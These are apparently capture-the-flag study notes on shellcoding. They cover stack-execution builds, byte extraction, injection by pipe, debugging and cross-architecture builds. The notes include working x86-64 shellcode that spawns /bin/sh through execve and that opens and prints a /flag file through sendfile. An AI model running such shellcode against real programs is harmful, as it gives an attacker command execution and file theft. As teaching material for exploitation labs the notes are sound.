# Shellcoding

tmux can behave very funny with shellcodes.

Compilation with `gcc -z execstack` allows execution on the stack. The issue arises when a function captures an address on the stack. Overriding this address should be able to get shellcode execution.

Adding data in the code:

```s
.string "hello"
.byte 0x48, 0x45, 0x4c, 0x4c, 0x4f


mov rbx, 0x0068732f6e69622f    <--- move "/bin/sh\0" into rbx
push rbx                       <--- push the thing onto the stack
mov rdi, rsp		       <--- first argument to the function
```
Compilation: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
Extraction: `objcopy --dump-section .text=shellcode-raw shellcode-elf`
Inject the shellcode: `( cat shellcode-raw; cat ) | ./sample1`

## Debugging shellcodes

Simply use `strace` to trace the syscalls. Or use `gdb` for the same. Breakpoints can also be hardcoded into the shellcode through the `int3` instruction. In case of dynamic stuff, it is not always known where the shellcode ends up, so this is much easier in that case.

## Other architectures

Using cross-compiler toolchain and through emulators.

amd64: `gcc -nostdlib -static shellcode.s -o shellcode-elf`
mips: `mips-linux-gnu-gcc -nostdlib -static shellcode.s -o shellcode-elg`

Running:
amd64: `./shellcode`
mips: `qemu-mips-static ./shellcode`

qemu has more options: `-strace` and `-g 1234` (remote gdb debugging)

## Examples

- For instance, shellcode basically tries to gain access to a shell of the form `execve('/bin/bash', NULL, NULL)` for arbitrary command execution.

```s
mov rax 59                 <----- execve syscall number
lea rdi, [rip+binsh]	   <----- first argument to the string
mov rsi, 0		   <----- second argument to NULL
mov rdx, 0		   <----- third argument to NULL
syscall			   <----- executing the syscall
binsh:
	.string "/bin/sh"
```

Other kinds of stuff: `sendfile(1, open("/flag", NULL), 0, 1000)`

```s
mov rbx, 0x00000067616c662f		<---------- pushes "/flag"
push rbx
mov rax, 2				<---------- syscall number of open()
mov rdi, rsp				<---------- first argument to open()
mov rsi, 0				<---------- second argument to open(): NULL
syscall					<---------- syscall

mov rdi, 1				<---------- first argument of sendfile(): the file descriptor (stdout)
mov rsi, rax				<---------- second argument of sendfile(): file descriptor returned by open()
mov rdx, 0				<---------- third argument
mov r10, 1000				<---------- fourth argument
mov rax, 40				<---------- syscall for sendfile()
syscall

mov rax, 60				<--------- syscall for exit()
syscall
```
